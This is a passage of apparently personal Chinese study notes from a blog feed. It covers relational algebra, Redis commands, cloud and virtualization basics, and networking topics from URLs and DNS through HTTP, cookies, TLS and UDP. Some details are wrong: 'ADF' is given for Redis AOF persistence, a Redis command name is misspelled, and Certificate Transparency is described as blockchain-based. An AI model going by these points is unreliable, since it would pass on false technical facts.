语言（ISBL）、关系演算语言（元组关系QUEL、APLHA；域关系QBE）、以及具有以上两者特点的SQL（除了查询还能操作、定义等）；下面仅介绍关系代数的操作</p><ul><li><p>并union：A+B（可用差表示）</p><blockquote><p>外并：即B表接在A表下面，并横向扩展属性，多出来的格子用NULL填充</p></blockquote></li><li><p>差difference：A-B</p></li><li><p>交intersection：A·B</p></li><li><p>广义笛卡尔积：RxS，运算后共有|R|x|S|个元组</p></li><li><p>选择selection/限制restriction：在R中选取满足条件F()=true的元组</p></li><li><p>投影projection：从关系R中选出部分属性列组成新的表</p></li><li><p>连接join/θ连接（可用笛卡尔积、选择、投影）：从RxS中选取满足条件的元组并构成表，统叫条件连接</p><blockquote><p>常用的连接有，等值连接和自然连接。等值连接：指定两个属性列相等条件；自然连接就是在等值连接的基础上去掉相同的两列的其中一列；</p></blockquote></li><li><p>外连接：在自然连接的基础上，仅保存拥有相同列的那行元组；相同列并不删除；匹配不了的给NULL</p><blockquote><p>左外连接：生成以连接左侧行数为基准的结果；右外连接：以右侧行数为准；全外连接：左+右</p></blockquote></li><li><p>除division（投影、笛卡尔积、选择）：R/S=选出R中包含关系S的元组，并对相同内容进行删减（先投影再除）</p><blockquote><p>对关系R中元组的某些属性求其象集=在该元组中去除这些属性后剩下的属性，A~n~的象集与关系S相同，则选出A~n~构成新表；</p></blockquote></li></ul></li></ol><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><ul><li>字符串</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SET 键 值//键需要区分大小写</span><br><span class="line">GET 键//返回值</span><br><span class="line">DEL 键//成功则返回1</span><br><span class="line">EXISTS 键//有则返回1否则0</span><br><span class="line">KEYS 匹配模式//查找所有匹配的键</span><br><span class="line">FLUSHALL//清除所有键值</span><br><span class="line">当存入中文时，要想显现redis-cli --raw</span><br><span class="line">TTL 键//返回-1则是无过期时间（秒）-2表示过期</span><br><span class="line">EXPIRE 键//设置生存时间</span><br><span class="line">SETEX 键 时 值//设置带时间的键值对</span><br><span class="line">SETNX 键 值//键不存在时更新值否则不动</span><br></pre></td></tr></table></figure><ul><li>列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPUSH 键 值//给列表左侧添加值</span><br><span class="line">LRANGE 键 开始 终止//栈，左闭右闭</span><br><span class="line">RPUSH 键 开始 终止//队列</span><br><span class="line">L/RPOP 键 [数]//从列表左/右开始数删除第n个</span><br><span class="line">LLEN 键//列表的长度</span><br><span class="line">LTRIM 键 开始 结束//只保留开始-结束之间的东西</span><br></pre></td></tr></table></figure><ul><li>集合</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SADD 键 值[值]//向集合中添加一个或多个值，返回1成功，0失败</span><br><span class="line">SMEMBERS 键//列出集合中所有的值</span><br><span class="line">SISMEMBER 键 值//判断集合中是否有该值，有1无0</span><br><span class="line">SREM 键 值[值]//删除集合中的元素</span><br><span class="line">SINTER/SUNION/SDIFF键[键]//交集/并集/差</span><br><span class="line">SCARD 键//集合的成员数</span><br></pre></td></tr></table></figure><ul><li>有序集合</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZADD 名 键 值[键 值]//默认递增</span><br><span class="line">ZRABNGE 集合 开始 结束[WITHSCORES]//显示键</span><br><span class="line">ZSCORE 集合 键//返回对应值</span><br><span class="line">ZRANK 集合 键//返回该键的排名</span><br></pre></td></tr></table></figure><ul><li>哈希</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HSET 名 键 值[键 值]<span class="operator">/</span><span class="operator">/</span>一个名下可以有多个键值对</span><br><span class="line">HGET 名 键<span class="operator">/</span><span class="operator">/</span>返回对应值</span><br><span class="line">HGETALL 名<span class="operator">/</span><span class="operator">/</span>返回名下所有键值对</span><br><span class="line">HDEL 名 键<span class="operator">/</span><span class="operator">/</span>删除</span><br><span class="line">HEXISTS 名 键<span class="operator">/</span><span class="operator">/</span>是否存在该键</span><br><span class="line">HKEYS 名<span class="operator">/</span><span class="operator">/</span>返回所有的键</span><br><span class="line">HLEN 名<span class="operator">/</span><span class="operator">/</span>返回键数</span><br></pre></td></tr></table></figure><ul><li>订阅模式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subscribe 频道名 [名]//订阅该频道</span><br><span class="line">publish 名 消息//向该消息频道发送消息</span><br></pre></td></tr></table></figure><ul><li>消息队列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">XADD 消息名 * 键 值</span><br><span class="line">XLEN 名//返回后面的键值对数</span><br><span class="line">XRANGE 名 - +//列出所有ID对应的消息</span><br><span class="line">XDEL 名 ID//删除ID对应的消息</span><br><span class="line">XTRIM 名 MAXLEN 数</span><br><span class="line">XREAD count e（一次读取个数） block e（没有则阻塞多少毫秒） streams 名 $（从最新的开始读取）</span><br><span class="line">XGROUP CREATE 消息名 组名 ID</span><br><span class="line">XINFO GROUPS 消息名//返回消费者组的信息</span><br><span class="line">XGROUP CREATECONSUMER 消息名 组名 消费者名//向该组中添加消费者</span><br></pre></td></tr></table></figure><ul><li>事务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MULTI 开启事务</span><br><span class="line">EXEC/DISCARD 执行事务（某一事务失败后不影响后续，与mysql不一样）</span><br></pre></td></tr></table></figure><ul><li>持久化：基于内存speed &gt; mysql</li></ul><p>RDB：规定时间内有多少修改才保存</p><p>ADF：将命令以日志形式存到ADF文件中</p><ul><li>主从复制：主节点为master。从节点slave，只读</li></ul><h3 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h3><p>简单来说就是通过网络按需提供可动态伸缩的廉价计算服务。类似于网盘网页的资源存储，提供远程的计算/存储功能。</p><h4 id="云基本知识"><a href="#云基本知识" class="headerlink" title="云基本知识"></a>云基本知识</h4><p><strong>云计算部署模式</strong></p><ul><li>公有云：放在公共地方，即付即用，由厂商负责管理。</li><li>私有云：内部部署于DMZ区，或者外部托管给其他厂商，仅自己使用。</li><li>社区云：面向一个社区或者服务专用的云，音乐网盘、存储网盘等</li><li>混合云：融合公有和私有云的优点，目前各大云服务商就是此类模式</li></ul><p><strong>云计算服务类型</strong></p><p>传统来说，由用户管理【网络、存储、服务器、虚拟化、OS、中间件、运行环境、数据、应用程序】</p><ul><li>IaaS/基础设施即服务：自虚拟化及以下由厂商管理，即提供基础设施；用户申请后能够部署运行任意软件；例如AWS、Google Engine</li><li>PaaS/平台即服务：将软件研发的平台作为服务，运行环境及以下都由厂商管理；说白了就拿最经典的微软的Azure做栗子，其服务中通常都是用的自家的windows与.NET</li><li>SaaS/软件即服务：厂商为用户已经提供了完整的软件功能，不需要自己再额外安装东西，即买即用；例如Office365</li></ul><p><strong>云计算特点</strong></p><ul><li>超大规模：集群更大（服务器更多）</li><li>虚拟化：用户无需关注硬件实体，除非买的裸金属服务器</li><li>按需分配服务：云计算=资源池，用户按照自己需要购买相应服务</li><li>广泛网络访问：API、VPN、浏览器、SSH等访问资源，无关地理，有简单的连接设备即可</li><li>高可靠：厂商做的都有备份、容错、镜像恢复、受灾方案等</li><li>服务可度量：为服务商和消费者提供透明的使用情况统计和实时结算等服务</li><li>可动态伸缩：通过虚拟化技术将一台服务器虚拟成多台服务器，对计算资源进行虚拟化和管理，可以实现服务器虚拟化、存储虚拟化、网络虚拟化和桌面虚拟化。</li></ul><p>其核心技术有：分布式存储、虚拟化技术、分布式资源管理、智能管理平台和编程模型。</p><h4 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h4><p>在计算机上创建一个抽象层即VMM，将单台计算机硬件元素虚拟地分成多个，每个虚拟机VM都有自己的OS。</p><p>根据VMM在虚拟化平台的位置，分为三类：</p><ul><li>裸机虚拟化模型：虚拟机监控器直接运行在没有操作系统的裸机上，具有最高特权级，管理底层所有的硬件资源。【VMwareESXi、Xen】</li><li>宿主机虚拟化模型：虚拟机监控器作为一个应用程序运行在宿主机操作系统（Host OS）上，而Guest OS运行于虚拟机监控器之上。【VMware、VirtualBox】</li><li>混合模型：虚拟机监控器作为OS上的一个特权级运行，在此之上可以建立其他的VM。【WSL、KVM】</li></ul><blockquote><p>虚拟化和容器化是不同的内容，容器侧重于打包，虚拟侧重于分割。此外虚拟机依赖于宿主设备架构，在x86上虚拟出来的仍是x86，而模拟器可以实现其他的硬件级别的模拟【qemu、bochs】</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> DB </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础</title>
      <link href="/2023/08/30/%E7%BD%91%E7%BB%9C%E4%B8%8EWeb/"/>
      <url>/2023/08/30/%E7%BD%91%E7%BB%9C%E4%B8%8EWeb/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#anchor</span><br></pre></td></tr></table></figure><p>首先介绍一下格式：协议 // 主机 ：端口/路径 .html ? 查询参数 # 锚点</p><p>URI （统一资源标识符）一种概念—实现方式：URL（统一资源定位符）、URN（统一资源命名符）</p><blockquote><p>URN需要解析器对该目标文件的独一无二的、不变的字符串进行解密来推出当前所在位置</p></blockquote><ul><li><p>协议：就是网络协议，在计算机网络中有具有规定信息交流的作用；包括http和https（超文本传输协议；网页），后者是前者的加密版本，具有更高的安全性（但目前http用的还是多）这样的协议还有FTP（文件传输协议；下载文件）、SMTP（电子邮件传输协议；发送接收电子邮件）</p></li><li><p>主机：就是我们所需要的网页文件等在哪台服务器上，上述例子中的主机段写（包括平常写的<code>www.xxxxxx.com</code>）是该网站所在的服务器的域名，在经过DNS服务器之后，会转换为IP地址（比如192.168.1.1等）；简单说就是该网站所存在的服务器的地址 （PS：如果记得IP地址的话，也可以用IP替换域名输入）</p></li><li><p>端口：首先说明端口是干什么的：确定你所需要的服务，然后从这个门（端口）进去。平时在浏览网站时很少会见到这个东西，因为端口大多都是默认的（有对应关系）；端口还分为物理意义上的端口和逻辑意义上的端口，我们这里介绍的是逻辑意义上的端口，物理端口指的就是集线器，HUB，路由等；</p><blockquote><p>逻辑意义上的接口范围是0~65535（TCP/UDP都有65535个端口），其中公认端口（每个端口有明确的服务）0—1023，动态端口（不固定服务）1024—65535</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>端口号</th><th>服务</th></tr></thead><tbody><tr><td>20、21</td><td>FTP（20连接、21传输）</td></tr><tr><td>25</td><td>SMTP</td></tr><tr><td>53</td><td>DNS</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>80/443</td><td>HTTP/S</td></tr></tbody></table></div><ul><li><p>路径：简单来说就是我们计算机上的文件的位置，网页文件（.html）在服务器上也有相应的存储路径。下面再来介绍一下相对路径和绝对路径</p><blockquote><p>绝对路径：这个最简单理解，就是 E:\学习资料\Asia 这样的，后面可以跟上具体的 文件名字.文件格式 animal_video01.mp4</p><p>相对路径：就是以当前的文件位置为基准，比如选取上面的Asia中的一个文件时可以直接输入animal_video02.mp4；如果我想要换成Europe（在学习资料目录下，与Asia同等级）就输入../Europe/animal_video01.mp4；如果是想要在当前目录继续向下就是2022/AKT01.mp4。总结一下就是，向上一级../ ，向下一级 /文件名</p></blockquote></li><li><p>查询参数：举个例子吧，在网上找百度网盘的资源时，会让你输入提取码，从URL上面来看 就是？后面会跟着一个password=xxxxxx，当你输入密码的时候，后面的xxxxxx就会变成你所输入的密码，也就是所说的参数；当然参数也不止这点功能，根据参数的不同，调用出来的界面也不一定相同（就像百度网盘提取码输入错误和正确，肯定是两个不同的界面）</p></li><li><p>锚点：显示当前网页内部的定位符号，类似于一键返回顶端这个功能。需要注意的是，服务器并不会处理锚点，走到预定位置是浏览器实现的</p></li></ul><hr><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>域名系统，作用就是将难记的IP地址转换为相对简单的网址，DNS服务器中存储的信息就是前面所说对应关系。</p><ul><li><p>功能：域名到IP的转换、设置主机别名、邮件服务器别名、负载分配</p></li><li><p>应用层协议，运行在UDP上，53号端口。</p></li><li><p>DNS域名解析过程如下:</p><p>浏览器输入目标域名——本地hosts文件检查，有就调用——查找本地DNS解析器<strong>缓存</strong>——查找首选DNS服务器——根DNS——顶级域名DNS——权威服务器——返回本地DNS服务器</p></li></ul><blockquote><p>在该过程中，上级服务器给自己一个DNS，自己再去查，叫做递归查询；如果是上级服务器直接查找到目标，然后再返回给自己叫迭代查询</p></blockquote><ul><li>域名等级：<code>.com</code>顶级域名，<code>bilibili.com</code>一级域名，<code>www.bilibili.com</code>二级域名；需要注意的是，如果需要使用二级域名，首先必须注册对应的一级域名。下面是一些常见的顶级域名：</li></ul><div class="table-container"><table><thead><tr><th>顶级域名</th><th>用途</th></tr></thead><tbody><tr><td>.com / .net  /.org</td><td>目前来说使用没有限制（商业/网络服务商/非营利组织）</td></tr><tr><td>.gov</td><td>政府机构</td></tr><tr><td>.edu</td><td>教育机构</td></tr><tr><td>.mil</td><td>军事机构</td></tr></tbody></table></div><ul><li>DNS资源记录（RR）：提供了主机名到IP地址的映射，每条记录均是4元组：(Name,Value,Type,TTL)；TTL记录该条记录的剩余存活时间，替他三项依据Type而定（由表可见，邮件服务与Web服务可在一台服务器上）：</li></ul><div class="table-container"><table><thead><tr><th>Type</th><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>A/AAAA</td><td>主机名</td><td>IPv4/6地址</td></tr><tr><td>NS</td><td>域</td><td>具体主机名</td></tr><tr><td>CNAME</td><td>别名</td><td>规范主机名</td></tr><tr><td>MX</td><td>邮件服务器别名</td><td>规范主机名</td></tr></tbody></table></div><ul><li><p>DNS报文：查询回答报文格式相同；</p><p>12B的首部区域=标识符2B + 标志4b + 问题数+回答RR数+权威RR数+附加RR数</p></li></ul><div class="table-container"><table><thead><tr><th>区域</th><th>内容</th></tr></thead><tbody><tr><td>问题区</td><td>正在查询的主机名字+问题类型</td></tr><tr><td>回答区</td><td>存RR</td></tr><tr><td>权威区</td><td>TLD</td></tr><tr><td>附加信息区</td><td>else</td></tr></tbody></table></div><hr><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>标识本机在网络中的地址，目前分为IPv4和IPv6地址，位于OSI模型的网络层；</p><ul><li><p><strong>IPv4</strong>：一共分为A、B、C、D、E五类，IPv4地址共有4个字段，也就是说32bit，每8bit用十进制表示；</p><p>IPv4地址由两部分构成-网络地址和主机地址，网络地址用于著名在哪个网络中，主机地址用于表明在这个网络中的位置；</p><p>这里是各个等级对应的范围（其中全0，全1的IP地址保留不用）下面从二进制来看一下ABC三类地址的构造</p></li></ul><div class="table-container"><table><thead><tr><th>类型</th><th>范围（左闭右开）</th></tr></thead><tbody><tr><td>A</td><td>0.0.0.0~128.0.0.0</td></tr><tr><td>B</td><td>128.0.0.0~192.0.0.0</td></tr><tr><td>C</td><td>192.0.0.0~224.0.0.0</td></tr><tr><td>D</td><td>224.0.0.0~240.0.0.0</td></tr><tr><td>E</td><td>240.0.0.0~248.0.0.0</td></tr></tbody></table></div><ul><li><p><strong>CIDR</strong>：消除了上述IPV4的A、B、C类网络的概念，因为实在是不公平，对于低类网络来说，基数大，但是能有主机号少，而等级高的其实也用不了那么多，因此采用CIDR技术，来消除上述不等；举ge例子<code>192.168.1.1/20</code>表示，前20位是网络号，后面的12位就是主机号。</p><p><strong>子网掩码</strong>：出于CIDR的使用而产生用来区分网络号与主机号，在IPV4中，子网掩码与其长度相同，均为32位。其转换为二进制时，1必须是连续的，有多少个1，就代表IP地址前几位是网络号（即网络地址），后面的则是主机号，可以通过IP地址与子网掩码的与运算确定网络地址。</p></li><li><p><strong>WAN</strong>指广域网（互联网），<strong>MAN</strong>指城域网，<strong>SAN</strong>存储区域网络（仅用于存储访问），<strong>CAN</strong>校园网，<strong>LAN</strong>指局域网（家庭、打印店组网），<strong>WLAN</strong>无线局域网（只是不用光缆的局域网），<strong>VLAN</strong>虚拟局域网，<strong>PAN</strong>指个人区域网络（USB、蓝牙等）；以上仅指明范围，与IP无关。</p></li><li><p><strong>Socket</strong>：IP:端口=套接字socket，服务端端口通常在1024以下，客户端用1025~1624，相互形成客户—服务器通信；其他策略有远程程序套用（RPC）、管道。</p></li><li><p><strong>IPV6</strong>：也叫做IPng，相比于IPv4具有更多的地址数量、还能提高网络性能（精简了数据包）。共128位=8组x4个十六进制数，<code>/</code>后面跟着前缀长度or掩码n，表示前n位是网络地址，后128-n位为主机号；支持內嵌IPV4。</p><p><strong>报头格式</strong>：</p><p>4bit表示IP版本+8bit流量分类+20bit流标签</p><p>16bit有效载荷的长度+8bit处理选项字段+8bit最大跳数</p><p>128bit源IP地址+128bit目标IP地址=40Byte，后面跟扩展报头</p></li><li><p><strong>Mac地址</strong>：物理地址，一张网卡一个，没有重复的，共48位；在OSI模型的数据链路层。</p><p><strong>ARP</strong>：地址解析协议，负责将IP地址转换为MAC地址，用于在物理层面上传输信息；在同一个网段时，通过查表对应MAC地址，否则进行广播查询（一般来说新设备接网后表上就有记录）。在不同网段时，先发送给网关，由网关再广播查询。</p></li></ul><blockquote><p>表单叫ARP表，包括动态和静态表项。动态表项会随着时间而删除，通常很短，如果有使用就延长；静态ARP表项可以指定通信时固定的MAC与IP的绑定，防止由动态造成的ARP污染</p></blockquote><hr><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP超文本传输协议，基于TCP/IP协议，默认端口80，用于传输网页。服务端接收到信息后与CGI交互，解释处理表单内容，产生处理。HTTP本身就是无状态协议，只有搭配cookie才能构成如今的个性化定制</p><p>HTTP/0.9：请求仅包含一个get方法和URL，响应仅含有HTML文档，如果没找到，则返回有关服务器错误代码。</p><p>HTTP/1.0：有了现在的完整请求行和部分请求报头，响应有了状态码的返回，可以支持除HTML文档以外的类型。</p><ul><li>Web页面由对象组成，HTML基本文件为一个初始对象，其中又引用了其他诸如图片、视频等对象。如果服务器对每个对象都经历”三次握手，四次挥手”的TCP连接断开过程的话，就叫做非持续连接，效率低下，于是就有了一个TCP连接上传输多个对象的持续性连接</li></ul><p>HTTP/1.1：完善了Http/1.0，请求报头中增加Host，连接可以复用</p><ul><li>持续性连接在HTTP1.1中又加入了流水线技术，也就是客户端在上一个对象A的请求发送后可以接着发送下一个对象B的请求，而无需等待对象A收到后再发送</li></ul><p>HTTP/2：基于SPDY协议，是一种二进制协议而非之前的文本协议，多路复用。对比于HTTP1.1有了如下几个方面的改进</p><ul><li>服务器推：当用户请求了一个基本HTML界面后，无需再单独发送该页面中其他对象的请求，服务器会自主为这个HTML请求，返回多个响应（HTML+其他对象）</li><li>响应报文的优先次序：每个报文都能有一个权重1-256，越大表明优先级越高，使得服务端能够对权重高的提前发送响应</li><li>成帧：<ul><li>首先我们要先介绍一个问题，HOL队首阻塞，当一个页面中第一个视频有几个G，而后面的都是MB级的资源时，按照1.1的规则，会在第一个视频中卡很长时间，后面的小资源被阻塞，导致用户感知延迟。1.1的解决方案是并行开多个TCP连接</li><li>2.0的成帧子层将每个报文分成帧（包括请求响应报文首部），传输时将每个资源的A1、B1…帧，下一次A2、B2…帧，即交错发送，在到达客户端后重新组装</li></ul></li></ul><p>HTTP/3：在传输使用QUIC协议，多路复用协议，延迟更低；</p><ul><li>在http2中使用单个TCP连接传输，而3中的QUIC使用UDP运行多个流，一旦有错误，仅错误的那条进行重新传输。</li></ul><p><strong>请求报文</strong>：客户端向服务端首次发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求方法+空格+请求URL+空+Http版本---------------------------------------请求行</span><br><span class="line">头部字段名：值--------------------------------请求头部/消息报头</span><br><span class="line">空行</span><br><span class="line">（请求正文）</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>方法（共8种）</th><th>内容</th></tr></thead><tbody><tr><td>get</td><td>向特定资源发送请求</td></tr><tr><td>post</td><td>请求处理数据，此时含有请求正文</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>消息报头（可由服务端自定义其他的）</th><th>解释</th></tr></thead><tbody><tr><td>Accept</td><td>客户端能够接收的文件类型</td></tr><tr><td>Accept-Charset</td><td>支持的字符集编码</td></tr><tr><td>Accept-Encoding</td><td>浏览器可支持的内容压缩编码类型</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td></tr><tr><td>Authorization</td><td>Http授权的证书类型</td></tr><tr><td>Cache-Control</td><td>请求响应过程遵循的缓存机制</td></tr><tr><td>Connection</td><td>表明是否需要持久连接的</td></tr><tr><td>Cookie</td><td>包含在请求URL域名下的所有有关cookie值</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td></tr><tr><td>Content-Type</td><td>MIME</td></tr></tbody></table></div><blockquote><p>MIME：媒体类型，是一种用在响应头中的，表示文件的性质与格式；<code>type(图片还是文本)/格式(png,html)</code></p></blockquote><p><strong>响应报文</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http版本+状态码+英文（not found？）-------------------状态行</span><br><span class="line">响应首部------------------------消息报头</span><br><span class="line">空行</span><br><span class="line">主体------------------响应正文</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>状态码</th><th>栗子</th><th>说明</th></tr></thead><tbody><tr><td>1xx(正在处理)</td><td></td><td></td></tr><tr><td>2xx(成功)</td><td>200(ok)、204(no content)</td><td>请求成功；服务器正常处理，但就是没返回内容</td></tr><tr><td>3xx(重定向，即需要附加操作)</td><td>301、302</td><td>请求资源换URL，并返回新家地址；暂时搬走、</td></tr><tr><td>4xx(客户端错误)</td><td>400、401、403、404</td><td>请求报文有错误；需要身份验证；拒绝；未找到</td></tr><tr><td>5xx(服务端错误)</td><td>500、501、503</td><td>服务器内部错误；不支持请求功能；超载</td></tr></tbody></table></div><hr><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie即服务器分发的身份证明。</p><ul><li><p>过程如下：</p><p>客户端发送一个post请求到服务器，将自己的用户名密码都给封装进去——》服务器收到后创建一个session对象，其中有唯一的会话ID——》服务器发送一个HttpResponse响应到客户端，其中包含Set-Cookie的头部——》客户端保存cookie，之后向服务器发送请求时，HttpRequest请求中会包含一个Cookie的头部——》服务器返回响应数据</p></li></ul><ul><li><p>Cookie的组成：NAME=value；Expires=date；Path=path；Domain=domain_name；Size；Secure；HttpOnly；</p><ul><li>NAME：cookie的名字；也就是下面要讲的session_ID</li></ul></li></ul><ul><li>Expires：该cookie的过期时间（登录好几次之后就又得重新登陆就是因为这个）；<ul><li>Path：在这里的作用并不是路径，而是说再同一网站之中都可以使用这个cookie。举个栗子：根目录为 / ，当你进入b站的任何界面都会发现右上角依然有你的登录信息；</li></ul></li><li>Domain决定该cookie在那些域是有效的，下面是关于Domain的不同设置</li></ul><blockquote><p>设为一级域名 <code>.baidu.com</code>，则这个域名下的所有二级域名都可以读取该 Cookie；</p><p>设为二级域名 <code>image.baidu.com</code>，则该 Cookie 只对设置的域名有效</p></blockquote><ul><li>Size：Cookie文件大小；</li><li><p>Secure：Cookie的安全属性，只有true和false两个值，为true时则浏览器只会在HTTPS和SSL等安全协议中传输cookie，而在其他的诸如HTTP中则不会传递；</p></li><li><p>HttpOnly同上只有true or false两个值当设置为true时，cookie是不允许JS脚本来改变的；</p></li></ul><ul><li>Session：会话，这个东西是存在于服务器的内存中，当用户第一次访问网站时，服务器生成一个session对象，并把该对象的唯一的session_ID作为cookie的一部分发送给客户端。自己设置登出时，就是请求结束对话，会指示服务器把相应的session_ID给删除，本地的cookie并不影响。但因为cookie有时间限制，时间过了之后就会被浏览器删除，用户需要再次登录</li></ul><ul><li><p>JWT：Json Web Token，用户第一次登陆后输入用户名和密码给服务器，接下来由服务器生成JWT并发送给客户端，而服务端只保存JWT签名过的密文，在客户端JWT以cookie或其他形式存储，每次请求时都会发送JWT（一般就叫token）。整个体系由header.payload.signature构成。</p><p>header表明算法，payload表明数据（不是cookie！），两者首先经过base64编码拼接后，与服务端存储的密码经过header算法之后与signature对照验证</p></li></ul><blockquote><p>session存储于服务器，cookie作为数据传输载体将session传递给客户端。token同样产生于服务器但由客户端保管，可以放在cookie中</p></blockquote><hr><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>超文本传输安全协议，比HTTP多出了Secure，运行于443端口上。</p><p>在HTTP的基础上，经由SSL/TLS协议来进行非对称加密（协议层下面还是TCP），形成客户端、服务端、CA机构三方。TLS前身为SSL，下文所说证书均为TLS证书。下面是一些需要注意的Word：</p><ul><li><strong>CA</strong>：证书授权中心；有证书就表明CA对该服务器信任。</li><li><strong>证书</strong>：包含网址、服务器公钥、所有者信息，还有最重要的数字签名</li><li><strong>数字签名</strong>：CA对服务器提交内容，用自己的私钥加密，用以让客户端验证。而CA公钥一般在浏览器中内置</li></ul><p><strong>服务端与CA</strong>：服务端向CA申请证书，提交各种信息及证明还有钱钱，之后拿到具有数字签名的证书。当客户端请求服务端时，会将该证书发送给客户端。</p><p><strong>客户端与服务端</strong>：客户端收到来自服务端的证书后，先结合保存在本地的CA公钥对证书上的信息进行验算，与数字签名对比，如果不对则表明中间被篡改过；无误后，浏览器使用该证书上写的服务端的公钥进行加密并发送，服务端用自己的私钥对该信息解密。</p><ul><li><p><strong>TLS具体过程</strong>：</p><p>由于非对称加密成本较高，故TLS采用，非对称加密来传递对称加密的密钥：</p><ol><li>Bob打招呼并发送第一随机数</li><li>Server接收，生成第二随机数，返回第二随机数、证书等（客户端验证）</li><li>Bob接收后，生成第三随机数（预主密钥），并用服务端公钥加密后返回给Server</li><li>Server接收到后，用私钥解密，得到预主密钥</li><li>双方用三个随机数共同加密生成最终会话密钥</li><li>之后进行对称加密进行交流</li></ol></li><li><p><strong>CT</strong>（证书透明度）框架：</p><p>解决了对于CA的信任问题。CA对服务端验证后，向区块链上提交CT日志，然后返回一个SCT（证书签署时间戳），将此SCT与证书啥的一同返回给服务端，服务端也会将此信息也返回给客户端；客户端验证服务器、CA、区块链日志，都符合后即可。由于区块链的特性，所以可信度极大地提高。</p></li></ul><hr><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>用户数据报协议，位于传输层；多用于应用层的DNS、TFTP（简单文件）、SNMP（简单网络管理）等</p><ul><li>无连接：客户端只需将数据包送走即可，不用提前与目标机器商量</li><li>无拥塞控制：不会探测路是否堵车</li><li>不保证可靠交付：不一定送达</li><li>面向报文：不拆分不合并，仅加头</li><li>首部开销小</li></ul><p>数据报格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">16bit源端口号 + 16bit目的端口号</span><br><span class="line">16位知指明本UDP包长度 + 16bit校验和</span><br><span class="line">数据~~~~</span><br></pre></td></tr></table></figure><p>在计算校验和时，先将其全部置0，之后添加一个12Byte的伪首部（伪首部与TCP包的相同，但是协议号为17-UDP），之后按照16bit的倍数进行0填充，再2B一组对其反码进行求和，将和再求反码填入校验和；（伪首部和填充0并不发送）</p><blockquote><p>原码-常规表示；正数反码=原码、负数反码=原码除符号位外取反；补码=反码+1</p></blockquote><hr><h3 id="TCP"><a href="#TCP" class="headerlink" 